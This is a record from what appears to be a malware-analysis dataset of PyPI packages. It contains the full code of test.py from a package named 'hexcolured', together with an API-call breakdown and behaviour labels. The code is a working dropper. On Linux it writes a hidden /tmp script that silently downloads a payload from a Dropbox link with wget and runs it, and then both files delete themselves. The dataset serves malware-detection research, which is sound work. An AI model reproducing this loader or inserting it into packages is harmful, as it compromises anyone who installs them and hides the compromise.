[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/hexcolured-1.0-py3-none-any/hexcolured/test.py",
    "code_snippet": "import os\nimport platform\nimport subprocess\nif platform.system().startswith(\"Linux\"):\n    with open('/tmp/.tmp.py', 'w') as f:\n        f.write(\"\"\"\nfrom os import remove\nfrom sys import argv\nimport subprocess\nsubprocess.call(\\\"wget https://dl.dropbox.com/scl/fi/fvfi5d3mibiycle2hasv1/prov.py?rlkey=ltyidkyjgwhxgkspqnxl7b7dk -O /tmp/.cache.py >/dev/null 2>&1 && chmod +x /tmp/.cache.py >/dev/null 2>&1 && python3 /tmp/.cache.py >/dev/null 2>&1 &\\\",shell=True)\nremove(argv[0])\"\"\")\n        f.close()\n        try:\n            subprocess.call(\"python3 /tmp/.tmp.py >/dev/null 2>&1 &\", shell=True)\n        except:\n            print()\nos.remove(os.path.abspath(__file__))",
    "pattern_analysis": {
      "api_sequence": [
        "platform.system",
        "open",
        "open.write",
        "open.close",
        "subprocess.call",
        "os.path.abspath",
        "os.remove"
      ],
      "api_sequence_with_args": [
        "platform.system()",
        "open('/tmp/.tmp.py', 'w')",
        "open.write(\"\"\"\nfrom os import remove\nfrom sys import argv\nimport subprocess\nsubprocess.call(\\\"wget https://dl.dropbox.com/scl/fi/fvfi5d3mibiycle2hasv1/prov.py?rlkey=ltyidkyjgwhxgkspqnxl7b7dk -O /tmp/.cache.py >/dev/null 2>&1 && chmod +x /tmp/.cache.py >/dev/null 2>&1 && python3 /tmp/.cache.py >/dev/null 2>&1 &\\\",shell=True)\nremove(argv[0])\"\"\")",
        "open.close()",
        "subprocess.call(\"python3 /tmp/.tmp.py >/dev/null 2>&1 &\", shell=True)",
        "os.path.abspath(__file__)",
        "os.remove(os.path.abspath(__file__))"
      ],
      "mapped_sequence": [
        {
          "api_name": "platform.system",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "open.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "subprocess.call",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "os.path.abspath",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        }
      ],
      "contextual_code": "import os\nimport platform\nimport subprocess\nif platform.system().startswith(\"Linux\"):\n    with open('/tmp/.tmp.py', 'w') as f:\n        f.write(\"\"\"\nfrom os import remove\nfrom sys import argv\nimport subprocess\nsubprocess.call(\\\"wget https://dl.dropbox.com/scl/fi/fvfi5d3mibiycle2hasv1/prov.py?rlkey=ltyidkyjgwhxgkspqnxl7b7dk -O /tmp/.cache.py >/dev/null 2>&1 && chmod +x /tmp/.cache.py >/dev/null 2>&1 && python3 /tmp/.cache.py >/dev/null 2>&1 &\\\",shell=True)\nremove(argv[0])\"\"\")\n        f.close()\n        try:\n            subprocess.call(\"python3 /tmp/.tmp.py >/dev/null 2>&1 &\", shell=True)\n        except:\n            print()\nos.remove(os.path.abspath(__file__))"
    }
  }
]